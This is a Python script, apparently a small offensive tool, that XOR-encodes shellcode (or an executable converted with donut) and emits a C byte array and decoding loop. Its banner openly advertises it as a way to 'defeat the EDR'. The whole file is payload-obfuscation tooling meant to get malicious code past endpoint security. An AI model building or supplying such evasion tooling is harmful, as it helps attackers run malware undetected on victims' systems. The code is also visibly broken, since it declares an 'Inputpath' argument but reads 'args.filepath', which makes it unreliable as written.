# Python 3.9
import argparse
import os
import donut
import warnings

# Argparse handler
parser = argparse.ArgumentParser()
parser.add_argument("-o", "--output", help="Output path", default=os.getcwd())
parser.add_argument("-k", "--key", help="Your XOR encryption key", default='UEdD')  # UEdD
parser.add_argument("-d", "--donut", help="Use in case the input is an executable", action='store_true', default=False)
parser.add_argument("Inputpath", help="Your shellcode file", type=str)
args = parser.parse_args()


def main():
    print("""
    ___   ___   ______   .______       __    __       _______. __    __  
    \  \ /  /  /  __  \  |   _  \     |  |  |  |     /       ||  |  |  | 
     \  V  /  |  |  |  | |  |_)  |    |  |  |  |    |   (----`|  |__|  | 
      >   <   |  |  |  | |      /     |  |  |  |     \   \    |   __   | 
     /  .  \  |  `--'  | |  |\  \----.|  `--'  | .----)   |   |  |  |  | 
    /__/ \__\  \______/  | _| `._____| \______/  |_______/    |__|  |__|

    ~!~ Xor your Shellcode and defeat the EDR! by Matanta, Matantamir10@gmail.com ~!~                                                                                                      
    """)

    # Ignore DeprecationWarning from
    warnings.filterwarnings("ignore")

    # File handling
    if args.donut:
        shellCodeCon = donut.create(file=args.filepath)

    else:
        inputFile = open(r"{}".format(args.filepath), 'rb')
        shellCodeCon = inputFile.read()

    byteShellcode = bytearray(shellCodeCon)

    # Key handling
    xorKey = bytearray(args.key, encoding='utf8')
    xorKeyToPrint = ''

    for xorKeyChar in xorKey:
        xorKeyToPrint = xorKeyToPrint + hex(xorKeyChar) + ", "

    xorKeyToPrint = xorKeyToPrint[:-2]

    # Xor the shellcode and add 0x01 byte
    for index, home in enumerate(byteShellcode):
        byteShellcode[index] = home ^ xorKey[index % len(xorKey)]
        byteShellcode[index] = byteShellcode[index] + 1 if byteShellcode[index] + 1 <= 255 else 0

    # string the xored shellcode
    stringByteShellCode = "unsigned char hexData[] = {\n"
    for index, home in enumerate(byteShellcode):
        if (index + 1) % 30 == 0:
            stringByteShellCode += "{},\n".format(hex(home))
        else:
            stringByteShellCode += "{},".format(hex(home))

    # Remove the last ',' from the sting and add };
    stringByteShellCode = stringByteShellCode[:-1]
    stringByteShellCode += "\n};"

    # Write the shellcode and the decryption function to files
    outputShellCodeFile = open(r"{}\Xor4u2f".format(args.output), 'w')
    outputShellCodeFile.write(stringByteShellCode)
    outputShellCodeFile.close()

    outputDecEncFunc = open(r"{}\DecEnc".format(args.output), 'w')
    outputDecEncFunc.write("int codeLength = sizeof(hexData);\n")
    outputDecEncFunc.write('char key[] = {' + xorKeyToPrint + ', 0x00};\n\n')
    outputDecEncFunc.write("int i;\n")
    outputDecEncFunc.write("int keyLength = strlen(key);\n")
    outputDecEncFunc.write("for( i = 0 ; i < codeLength ; i++ )\n")
    outputDecEncFunc.write("{\n")
    outputDecEncFunc.write("    hexData[i]=hexData[i]-1;\n")
    outputDecEncFunc.write("    hexData[i]=hexData[i]^key[i%keyLength];\n")
    outputDecEncFunc.write("}\n")
    outputDecEncFunc.close()

    # User output
    print("[V] You encoded shellcode (C code style) : {}\Xor4u2f".format(args.output))
    print("[V] You encdec function (C code style) : {}\DecEnc".format(args.output))


if __name__ == '__main__':
    main()